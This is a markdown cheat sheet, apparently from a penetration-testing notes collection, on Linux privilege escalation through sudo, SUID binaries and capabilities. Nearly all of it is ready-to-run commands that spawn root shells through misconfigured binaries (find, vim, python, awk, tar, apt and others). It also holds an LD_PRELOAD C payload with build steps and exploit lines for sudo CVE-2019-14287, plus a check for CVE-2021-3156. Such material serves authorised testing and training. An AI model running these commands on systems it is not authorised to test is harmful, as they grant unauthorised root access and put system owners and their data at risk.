---
title: Sudo, SUID & Capabilities
category: privesc-linux
description: Common GTFOBins paths and sudo misconfigurations.
tags: [linux, privesc, suid, sudo, gtfobins]
os: [linux]
order: 10
---

## Check sudo rights

```bash
sudo -ln
sudo -l -U {{USER}}
```

## NOPASSWD escalation patterns

For each binary that you can run as root, check GTFOBins. Common wins:

```bash
# /bin/bash, /bin/sh, /bin/dash, etc — instant root
sudo /bin/bash

# find
sudo find . -exec /bin/sh \; -quit

# vim / nano / less / man
sudo vim -c '!sh'
sudo less /etc/hosts ; then !sh
sudo man man ; then !sh

# python / perl / ruby / php / lua / node
sudo python3 -c 'import os;os.execl("/bin/sh","sh")'
sudo perl -e 'exec "/bin/sh";'

# awk / sed / xargs
sudo awk 'BEGIN{system("/bin/sh")}'
sudo sed -n '1e exec sh 1>&0' /etc/hosts
sudo xargs -a /dev/null /bin/sh

# git / mysql / sqlite3
sudo git -p help    # !sh
sudo mysql -e '\! /bin/sh'
sudo sqlite3 /dev/null '.shell /bin/sh'

# tcpdump (post-rotate)
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/x.sh -Z root

# apt / apt-get
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh

# env preserved → LD_PRELOAD / LD_LIBRARY_PATH
cat > /tmp/x.c <<'EOF'
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so program-allowed-by-sudo
```

## CVE-2019-14287 (Runas ALL,!root)

If sudoers has `(ALL, !root)`:

```bash
sudo -u#-1 id
sudo -u#4294967295 id
```

## CVE-2021-3156 (Baron Samedit, pre-1.9.5p2)

```bash
sudoedit -s /
# vulnerable if "sudoedit: /: not a regular file"
```

## SUID quick wins (GTFOBins)

```bash
# nmap (legacy)
nmap --interactive ; !sh
# bash with -p
/usr/bin/bash -p
# python suid
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# tar
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# find
find . -exec /bin/sh -p \; -quit
```

## Capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid+ep on python/perl/ruby — same trick as SUID
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# cap_dac_read_search → read shadow
# cap_sys_admin / cap_sys_ptrace → kernel-level
```
